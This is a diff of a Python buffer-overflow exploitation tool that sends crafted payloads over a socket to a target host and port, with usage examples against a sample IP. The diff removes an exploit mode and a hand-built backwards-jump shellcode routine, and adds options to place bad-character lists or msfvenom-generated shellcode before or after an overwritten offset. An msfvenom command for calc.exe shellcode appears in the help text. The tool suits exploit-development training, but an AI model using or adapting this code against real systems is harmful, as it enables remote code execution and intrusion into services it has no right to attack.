@@ -4,6 +4,8 @@
 #
 # Isabelle's generic buffer overflow tool
 #
+# https://github.com/isabellecda/cyber-scripts
+#
 
 import sys
 import socket
@@ -32,14 +34,19 @@ def print_usage(scriptName):
 	print("write - Writes hex value to buffer offset")
 	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809".format(scriptName))
 	print("")
-
-	print("write - Write badchars (before or after offset content) for badchar verification")
-	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=after --exclude=000a".format(scriptName))
-	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=before --exclude=000a --reversejmp=800".format(scriptName))
+	
+	print("write - Writes hex value to buffer offset and additional content before and/or after the offset content")
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=90909090 --after=9090".format(scriptName))
 	print("")
 
-	print("exploit - Sends malicious payload via buffer overflow")
-	print(" {} -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=opencalc --nops=10".format(scriptName))
+	print("write - Writes badchars (before or after offset content) for badchar verification")
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=badchar --exclude=000a".format(scriptName))
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=badchar --exclude=000a".format(scriptName))
+	print("")
+	
+	print("write - Sends malicious shell code (hex string file) via buffer overflow")
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=shellcode --shellcode=opencalc --nops=10".format(scriptName))
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=shellcode --shellcode=opencalc".format(scriptName))
 	print("")
 
 	print("Parameters:")
@@ -60,12 +67,13 @@ def print_usage(scriptName):
 	print("		Use 'g' or 'l' to delimit the order. Examples:")
 	print("		'g01020304l05060708' --> will send '0102030408070605'")
 	print("		'01020304' --> will send '01020304'")
-	print(" --badchar	: Adds bad chars before (before) or after (after) the content. Used for bad char testing.")
+	print(" --before|after	: Writes additional content (hex string) before and/or after the offset content.")
+	print("		If content is 'badchar', content will be a generated badchar list. Used for bad char testing.")
+	print("		If content is 'shellcode', --shellcode parameter will be expected")
 	print(" --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.")
-	print(" --reversejmp	: Size in bytes to jump before the content to inject bad chars or the shell code.")
 	print(" --shellcode	: Hex shell code file generated using msfvenom. Example:")
 	print("		msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f hex EXITFUNC=thread -o opencalc")
-	print(" --nops		: Amount of nops to add before and after the shell code. Default is 0.")
+	print(" --nops		: Amount of nops to add before and after the addition write content (be if badchars, shellcode or simple hexstring). Default is 0.")
 	print(" --value		: Offset value.")
 	print(" --length	: Cyclic pattern length.")
 
@@ -176,28 +184,16 @@ def get_binary_content(writeContent):
 
 	return binascii.unhexlify(finalContent)
 
-# Creates backwards jmp instruction
-# So as not to depend on external asm compilers or opcode generators, the following long jump code can only jump numbers divisible by 256. The following assembly code is used to jmp backwards (ref.: phrack #62 article 7, Aaron Adams):
-#	fldz     		; D9EE
-#	fnstenv [esp-12]  	; D97424F4
-#	pop ecx    		; 59
-#	add cl,10   		; 80C10A
-#	nop     		; 90
-#	dec ch    		; FECD (repeated to add 256*mult jmp size)
-#	jmp ecx    		; FFE1  
-def create_reverve_jmp(mult):
-	head = "D9EED97424F45980C10A90"
-	tail = "FFE1"
-	jmp=""
+# Get shell code from shell code file
+def get_shell_code(shellCodeFile):
+	if not os.path.exists(shellCodeFile):
+		print("Error: --shellcode param is not a valid file")
+		sys.exit(1);
+	
+	with open(shellCodeFile) as f: shellCodeStr = f.read()
+	return binascii.unhexlify(shellCodeStr)
 
-	for i in range(0, int(mult)):
-		jmp = jmp + "FECD"
 
-	jmpCmd = head + jmp + tail
-
-	print("Reverse jmp:", jmpCmd) if VERBOSE else None
-
-	return binascii.unhexlify(jmpCmd)
 
 # Create payload functions ##############################################################
 #########################################################################################
@@ -229,90 +225,22 @@ def create_write_payload(buffHead, buffSize, offsetCount, binContent):
 
 	return payload
 
-# write - bad chars before content
-def create_badchar_payload_before(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, excludeChars=""):
-	# badchars
-	badChars = create_bad_chars(0, excludeChars)
-
-	# offset
-	offset = b'A' * (offsetCount - len(badChars))
-
-	# Limitation: reverse jump can only be divisible by 256
-	tJmp = reverseJmpSize % 256
-
-	if tJmp == 0:
-		# tail
-		tail = b'Z' * (buffSize - len(offset) - len(badChars) - len(binContent))
-		
-		# payload
-		payload = buffHead + offset + badChars + binContent + tail		
-	else:
-		reverseJmp = create_reverve_jmp(tJmp)
-
-		# tail
-		tail = b'Z' * (buffSize - len(offset) - len(badChars) - len(binContent) - len(reverseJmp))
-		
-		# payload
-		payload = buffHead + offset + badChars + binContent + reverseJmp + tail
-
-
-	return payload
-
-# write - bad chars after content
-def create_badchar_payload_after(buffHead, buffSize, offsetCount, binContent, excludeChars=""):
-	# offset
-	offset = b'A' * int(offsetCount)
-
-	# badchars
-	badChars = create_bad_chars(0, excludeChars)
-
-	# tail
-	tail = b'C' * (buffSize - len(offset) - len(binContent) - len(badChars))
-
-	# payload
-	payload = buffHead + offset + binContent + badChars + tail
-
-	return payload
-
-# exploit
-def create_exploit_payload(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, shellCodeFile, nopsSize = 2):
-	print("val: ".format(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, shellCodeFile, nopsSize))
-
+# write - additional content (before or after hexcontent at offset)
+def create_write_payload_additional(buffHead, buffSize, offsetCount, binContent, beforeContent, afterContent, nopsSize = 0):	
 	# nops
 	nops = b'\x90' * nopsSize
 
-	# shellcode
-	with open(shellCodeFile) as f: shellCodeStr = f.read()
-	shellCode = binascii.unhexlify(shellCodeStr)	
+	# offset
+	offset = b'A' * (offsetCount - len(nops) - len(beforeContent) - len(nops) )
 
-	# Limitation: reverse jump can only be divisible by 256
-	tJmp = reverseJmpSize % 256
-
-	if tJmp == 0:
-		# offset
-		offset = b'A' * int(offsetCount)
-
-		# tail
-		tail = b'C' * (buffSize - len(offset) - len(binContent) - len(nops) - len(shellCode) - len(nops))
-
-		# payload
-		payload = buffHead + offset + binContent + nops + shellCode + nops + tail
-
-	else:
-		# offset	
-		offset = b'A' * (int(offsetCount) - len(shellCode))
-
-		reverseJmp = create_reverve_jmp(tJmp)
-
-		# tail
-		tail = b'Z' * (buffSize - len(offset) - len(nops) - len(shellCode) - len(nops) - len(binContent) - len(reverseJmp))
-
-		# payload
-		payload = buffHead + offset + nops + shellCode + nops + binContent + reverseJmp + tail
+	# tail
+	tail = b'Z' * (buffSize - len(offset) - len(nops) - len(beforeContent) - len(nops) - len(binContent) - len(nops) - len(afterContent) - len(nops))
+	
+	# payload
+	payload = buffHead + offset + nops + beforeContent + nops + binContent + nops + afterContent + nops + tail		
 
 	return payload
 
-		
 
 
 # Main execution block ##################################################################
@@ -327,7 +255,7 @@ if __name__ == "__main__":
 
 	# Input parameters
 	try:
-		opts, args = getopt.getopt(sys.argv[1:], "hnvm:", ["help", "norec", "verbose", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "badchar=", "exclude=", "reversejmp=", "shellcode=", "nops=", "interact=", "value=", "length="])
+		opts, args = getopt.getopt(sys.argv[1:], "hnvm:", ["help", "norec", "verbose", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "before=", "after=", "exclude=", "shellcode=", "nops=", "interact=", "value=", "length="])
 	except getopt.GetoptError as err:
 		print("Error:", err)
 		print_usage(scriptName)
@@ -336,20 +264,27 @@ if __name__ == "__main__":
 	# Default values
 	norec = False
 	mode = ""
+	
 	rhost = ""
 	rport = 0
+	
 	buffSizeParam = 0
 	buffHead = b''
+	
 	offset = 0
 	hexContent = ""
-	badCharOption = ""
+	
 	badCharExcluded = ""
-	reverseJmpSize = 0
 	shellCodeFile = ""
+	
 	nops = 0
 	interact = []
+	
 	patternValue = ""
 	patternLength = 8192
+	
+	before = ""
+	after = ""
 
 	# Verify options
 	for opt, value in opts:
@@ -378,12 +313,12 @@ if __name__ == "__main__":
 			offset = int(value)
 		elif opt == '--hexcontent':
 			hexContent = value
-		elif opt == '--badchar':
-			badCharOption = value
+		elif opt == '--before':
+			before = value
+		elif opt == '--after':
+			after = value
 		elif opt == '--exclude':
 			badCharExcluded = value
-		elif opt == '--reversejmp':
-			reverseJmpSize = int(value)
 		elif opt == '--shellcode':
 			shellCodeFile = value
 		elif opt == '--nops':
@@ -399,7 +334,7 @@ if __name__ == "__main__":
 			print_usage(scriptName)
 			sys.exit(1)
 
-	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | badchar={} | exclude={} | reversejmp={} | shellcode={} | nops={} | interact={} | value={} | length={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, badCharOption, badCharExcluded, reverseJmpSize, shellCodeFile, nops, interact, patternValue, patternLength)) if VERBOSE else None
+	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | before={} | after={} | exclude={} | shellcode={} | nops={} | interact={} | value={} | length={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, before, after, badCharExcluded, shellCodeFile, nops, interact, patternValue, patternLength)) if VERBOSE else None
 
 	# Tool
 	if not mode:
@@ -438,28 +373,33 @@ if __name__ == "__main__":
 			sys.exit(1);
 
 		binContent = get_binary_content(hexContent)
-
-		if badCharOption == "before":
-			if not reverseJmpSize:
-				print("Error: incorrect number of params for --mode=write, --badchar=before.")
-				sys.exit(1);
-
-			buffPayload = create_badchar_payload_before(buffHead, buffSize, offset, binContent, reverseJmpSize, badCharExcluded)
-
-		elif badCharOption == "after":
-			buffPayload = create_badchar_payload_after(buffHead, buffSize, offset, binContent, badCharExcluded)
-			
+		beforeContent = ""
+		afterContent = ""
+		
+		if before == "badchar":
+			beforeContent = create_bad_chars(0, badCharExcluded)
+		elif before == "shellcode":
+			beforeContent = get_shell_code(shellCodeFile)
+		elif before:
+			beforeContent = get_binary_content(before)
 		else:
+			beforeContent = b''
+			
+		if after == "badchar":
+			afterContent = create_bad_chars(0, badCharExcluded)
+		elif after == "shellcode":
+			afterContent = get_shell_code(shellCodeFile)
+		elif after:
+			afterContent = get_binary_content(after)
+		else:
+			afterContent = b''
+		
+		if beforeContent or afterContent:
+			# Write additional
+			buffPayload = create_write_payload_additional(buffHead, buffSize, offset, binContent, beforeContent, afterContent, nops)
+		else:
+			# Simple write
 			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)
-
-	elif mode == "exploit":
-		if not os.path.exists(shellCodeFile):
-			print("Error: shellcode param is not a valid file")
-			sys.exit(1);
-
-		binContent = get_binary_content(hexContent)
-
-		buffPayload = create_exploit_payload(buffHead, buffSize, offset, binContent, reverseJmpSize, shellCodeFile, nops)
 	else:
 		print("Error: incorrect number of params.")
 		print_usage(scriptName)
